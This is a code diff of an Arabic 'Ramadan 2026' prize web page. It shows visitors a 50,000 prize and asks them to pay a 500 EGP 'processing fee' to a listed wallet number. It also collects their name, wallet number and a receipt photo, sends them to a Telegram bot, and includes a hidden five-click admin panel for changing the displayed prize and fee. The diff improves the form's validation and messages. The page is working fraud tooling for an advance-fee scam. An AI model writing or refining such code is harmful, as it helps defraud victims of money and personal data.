@@ -15,39 +15,22 @@
             margin: 0; font-family: 'Cairo', sans-serif;
             background: var(--main-grad); color: white;
             min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px;
-            overflow-x: hidden;
         }
 
-        /* زينة رمضان */
-        .ramadan-header {
-            text-align: center; margin-bottom: 20px; position: relative;
-        }
-        .ramadan-kareem {
-            font-size: 24px; font-weight: 900; color: var(--gold);
-            text-shadow: 0 0 15px rgba(255, 204, 0, 0.7);
-            animation: glow 2s ease-in-out infinite;
-        }
-        @keyframes glow { 0%, 100% { opacity: 0.8; } 50% { opacity: 1; transform: scale(1.05); } }
+        .ramadan-header { text-align: center; margin-bottom: 20px; }
+        .ramadan-kareem { font-size: 24px; font-weight: 900; color: var(--gold); text-shadow: 0 0 15px rgba(255, 204, 0, 0.7); }
         
-        .lantern { font-size: 30px; display: inline-block; animation: swing 3s ease-in-out infinite; }
-        @keyframes swing { 0%, 100% { transform: rotate(-10deg); } 50% { transform: rotate(10deg); } }
-
-        /* لوحة التحكم السرية للمدير */
         .admin-box {
             background: rgba(0,0,0,0.95); border: 2px solid var(--gold);
-            padding: 15px; border-radius: 15px; font-size: 14px;
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 2000; display: none; width: 250px; text-align: center;
+            padding: 15px; border-radius: 15px; position: fixed; top: 50%; left: 50%; 
+            transform: translate(-50%, -50%); z-index: 2000; display: none; width: 250px; text-align: center;
         }
         .admin-box input { width: 80%; padding: 8px; margin: 10px 0; background: #222; color: white; border: 1px solid #444; border-radius: 5px; }
-        .admin-box button { background: var(--gold); border: none; padding: 10px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
 
         .card {
             background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(12px);
             border: 1px solid rgba(255,255,255,0.2); padding: 30px 20px;
-            border-radius: 25px; width: 100%; max-width: 400px;
-            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-            position: relative;
+            border-radius: 25px; width: 100%; max-width: 400px; text-align: center;
         }
 
         .logo-text { font-size: 26px; font-weight: 900; color: var(--gold); margin-bottom: 10px; cursor: pointer; }
@@ -56,7 +39,6 @@
             background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px;
             margin-bottom: 20px; border-right: 5px solid var(--gold);
         }
-        .balance-area span { font-size: 13px; color: #aaa; }
         .balance-area div { font-size: 35px; font-weight: 700; }
 
         .form-group { text-align: right; margin-bottom: 15px; }
@@ -77,13 +59,11 @@
             padding: 15px; border-radius: 12px; cursor: pointer; display: block;
             margin-bottom: 20px; transition: 0.3s;
         }
-        .file-label:hover { border-color: var(--success); background: rgba(0,255,136,0.1); }
 
         .submit-btn {
             background: linear-gradient(90deg, #00ff88, #00d4ff);
             color: #001; border: none; width: 100%; padding: 15px;
-            font-size: 19px; font-weight: 900; border-radius: 12px;
-            cursor: pointer; box-shadow: 0 5px 15px rgba(0,255,136,0.3);
+            font-size: 19px; font-weight: 900; border-radius: 12px; cursor: pointer;
         }
 
         #loader {
@@ -97,18 +77,14 @@
 <body>
 
 <div class="ramadan-header">
-    <span class="lantern">🏮</span>
-    <span class="ramadan-kareem">رمضان كريم 2026</span>
-    <span class="lantern">🌙</span>
+    <span class="ramadan-kareem">🌙 رمضان كريم 2026 🏮</span>
 </div>
 
 <div class="admin-box" id="adminBox">
     <h3 style="color:var(--gold); margin-top:0;">إعدادات المدير</h3>
-    <label style="color:white">الربح المعروض:</label>
-    <input type="number" id="pIn" value="50000">
-    <label style="color:white">الرسوم المطلوبة:</label>
-    <input type="number" id="fIn" value="500">
-    <button onclick="saveAndHide()">حفظ الإعدادات</button>
+    <input type="number" id="pIn" value="50000" placeholder="الربح">
+    <input type="number" id="fIn" value="500" placeholder="الرسوم">
+    <button onclick="saveAndHide()" style="width:100%; padding:10px; background:var(--gold); border:none; border-radius:5px; font-weight:bold;">حفظ</button>
 </div>
 
 <div class="card">
@@ -121,20 +97,20 @@
 
     <div class="form-group">
         <label>الاسم بالكامل:</label>
-        <input type="text" id="userName" placeholder="اكتب اسمك بالكامل">
+        <input type="text" id="userName" placeholder="اكتب اسمك">
     </div>
 
     <div class="form-group">
-        <label>رقم محفظتك المستلمة:</label>
+        <label>رقم محفظتك:</label>
         <input type="tel" id="userWallet" placeholder="01xxxxxxxxx">
     </div>
 
     <p style="font-size: 13px;">يرجى تحويل رسوم المعالجة (<span id="fOut" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
     <div class="cash-box">01226811784</div>
 
-    <label class="file-label" onclick="document.getElementById('imgInput').click()">
-        <input type="file" id="imgInput" hidden onchange="handleFileSelect(this)">
-        <span id="fn">أرفق صورة إيصال التحويل 📸</span>
+    <label class="file-label">
+        <input type="file" id="imgInput" style="display:none" onchange="fileChanged(this)">
+        <span id="fn" onclick="document.getElementById('imgInput').click()">أرفق صورة إيصال التحويل 📸</span>
     </label>
 
     <button class="submit-btn" onclick="sendData()">تأكيد وإرسال الطلب</button>
@@ -142,7 +118,7 @@
 
 <div id="loader">
     <div class="spin"></div>
-    <p style="margin-top:15px;">جاري تشفير البيانات وإرسال الطلب...</p>
+    <p style="margin-top:15px;">جاري إرسال الطلب وتأكيد البيانات...</p>
 </div>
 
 <script>
@@ -152,10 +128,7 @@
     let clicks = 0;
     function checkAdmin() {
         clicks++;
-        if (clicks >= 5) {
-            document.getElementById('adminBox').style.display = 'block';
-            clicks = 0;
-        }
+        if (clicks >= 5) { document.getElementById('adminBox').style.display = 'block'; clicks = 0; }
     }
 
     function saveAndHide() {
@@ -166,22 +139,24 @@
         document.getElementById('adminBox').style.display = 'none';
     }
 
-    function handleFileSelect(input) {
+    // وظيفة لتأكيد اختيار الصورة
+    function fileChanged(input) {
         if (input.files && input.files[0]) {
-            document.getElementById('fn').innerText = '✅ تم اختيار الصورة';
+            document.getElementById('fn').innerText = '✅ تم اختيار الصورة: ' + input.files[0].name.substring(0, 15) + '...';
+            document.getElementById('fn').style.color = '#00ff88';
         }
     }
 
     async function sendData() {
-        const name = document.getElementById('userName').value;
-        const wallet = document.getElementById('userWallet').value;
+        const name = document.getElementById('userName').value.trim();
+        const wallet = document.getElementById('userWallet').value.trim();
         const fileInput = document.getElementById('imgInput');
         const file = fileInput.files[0];
 
-        if(!name || !wallet || !file) { 
-            alert("يرجى ملء كافة البيانات وإرفاق الصورة!"); 
-            return; 
-        }
+        // تنبيهات مخصصة عشان تعرف إيه اللي ناقص
+        if (!name) { alert("من فضلك اكتب اسمك!"); return; }
+        if (!wallet) { alert("من فضلك اكتب رقم محفظتك!"); return; }
+        if (!file) { alert("من فضلك أرفق صورة التحويل!"); return; }
 
         document.getElementById('loader').style.display = 'flex';
 
@@ -196,16 +171,17 @@
         fd.append('caption', msg);
 
         try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            document.getElementById('loader').style.display = 'none';
-            alert("تم إرسال طلبك! رمضان كريم وسحب مبارك.");
-            document.getElementById('userName').value = "";
-            document.getElementById('userWallet').value = "";
-            fileInput.value = "";
-            document.getElementById('fn').innerText = 'أرفق صورة إيصال التحويل 📸';
+            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            if (response.ok) {
+                document.getElementById('loader').style.display = 'none';
+                alert("تم إرسال طلبك بنجاح! رمضان كريم.");
+                location.reload(); // إعادة تحميل الصفحة لتصفير البيانات
+            } else {
+                throw new Error();
+            }
         } catch(e) {
             document.getElementById('loader').style.display = 'none';
-            alert("فشل الإرسال.");
+            alert("حدث خطأ في الإرسال، تأكد من النت أو بيانات البوت.");
         }
     }
 </script>
